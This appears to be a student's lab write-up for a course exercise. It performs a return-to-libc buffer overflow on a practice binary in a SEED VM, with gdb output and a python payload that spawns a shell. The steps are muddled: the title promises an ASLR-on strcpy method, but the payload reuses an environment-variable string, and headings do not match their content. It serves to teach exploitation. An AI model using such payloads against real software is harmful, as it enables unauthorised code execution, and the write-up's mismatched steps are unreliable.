# Lab5_2 - Buffer overflow attack(turn on ASLR, turn on NX)

## Overview
* Previous lab, we use '/bin/sh' string in a environment in linux system. 
* This time, we're going to make '/bin/sh' string into a memory using strcpy and jump to the text!!!
* I think this is really cool and I truly admire who though these kind of things.

## PAYLOAD
+ Payload = PADDING + build-string-payload + &system() + &exit_path + &cmd_string
+ Note that, this time, we're building our own string!

## Before get started
+ Make sure that the ASLR is turned off.
```
[02/23/22]seed@VM:Byeongchan$ cat /proc/sys/kernel/randomize_va_space 
2
[02/23/22]seed@VM:Byeongchan$

```
+ Make sure not using stack executable when compiling c file
```
gcc -g -static -fno-stack-protector ans_check7.c -o ans_check7_static
```

## Steps
+ 1,2,3,4 - Have done on previous lab
5. Find out the address of the strcpy & pop-pop-ret function
6. Choose an address for our string destination
7. Find out where hexacode of strings are.(We're using them to build our own command)
8. Build the command text we're using
9. Make the payload and execute

### Step5 - Find out the address of the strcpy & pop-pop-ret function
+ I found the 54 bytes are needed for the padding using exit function
+ If you're not sure what it does, look back previous practice
```
[02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
```


### Step6 - Choose an address for our string destination
+ Address of system() : 0xb7da4da0
+ I tried to find the system in the program, but it ended with ‘00’ so I tried to find another one using gdb.
```
[02/23/22]seed@VM:Byeongchan$ objdump -D ans_check7 | grep system
08048420 <system@plt>:
 8048639:	e8 e2 fd ff ff       	call   8048420 <system@plt>
[02/23/22]seed@VM:Byeongchan$
```
+ This time, I used gdb method.
```
[02/23/22]seed@VM:Byeongchan$ gdb -q ans_check7
Reading symbols from ans_check7...done.
gdb-peda$ run
Starting program: /home/seed/lab5/ans_check7 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
Usage: /home/seed/lab5/ans_check7 <answer>
[Inferior 1 (process 3129) exited normally]
Warning: not running or target is remote
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7da4da0 <__libc_system>
gdb-peda$
```

### Step7 - Find out where hexacode of strings are.(We're using them to build our own command)
+ Address of exit() : 0xb7d989d0
+ This time, I just using gdb method very first.
```
[02/23/22]seed@VM:Byeongchan$ gdb -q ans_check7
Reading symbols from ans_check7...done.
gdb-peda$ run
Starting program: /home/seed/lab5/ans_check7 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
Usage: /home/seed/lab5/ans_check7 <answer>
[Inferior 1 (process 3147) exited normally]
Warning: not running or target is remote
gdb-peda$ p exit
$1 = {<text variable, no debug info>} 0xb7d989d0 <__GI_exit>
```

### Step8 - Build the command text we're using
+ The address of cmd_string: 0xbffff0d3
+ Repeatable note is here
```
[02/23/22]seed@VM:Byeongchan$ gcc find_var.c -o find_var
[02/23/22]seed@VM:Byeongchan$ find_var SHELL
0xbffff0d3
[02/23/22]seed@VM:Byeongchan$ echo $SHELL
/bin/bash
[02/23/22]seed@VM:Byeongchan$
```

### Step9 - Make the payload and execute
+ The payload I made is shown below
+ &system:  0xb7da4da0 <__libc_system>
+ &exit_path: b7d989d0 <__GI_exit>
+ &cmd_string: 0xbffff0d3, cmd_string address
```
$(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xd3\xf0\xff\xbf'")
```
+ However, there is one problem executing the payload with the program
+ The payload I made above failed with ‘/bash’ not found error. And I knew the meaning of it, because find_var program returned the address of ‘SHELL’ text a little bit different. So, I needed to make adjustment a bit. 
+ First, I tried 3 less bytes and I also failed with ‘bin/bash’ not found. 
+ Second, I tried 4 less bytes and I got a new shell.
+ Below is my successful execution command.
```
[02/23/22]seed@VM:Byeongchan$ ./ans_check7 $(python -c "print '\xAA'*54 + '\xa0\x4d\xda\xb7' + '\xd0\x89\xd9\xb7' + '\xcf\xf0\xff\xbf'")
```
![lab5_1](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_1.png)


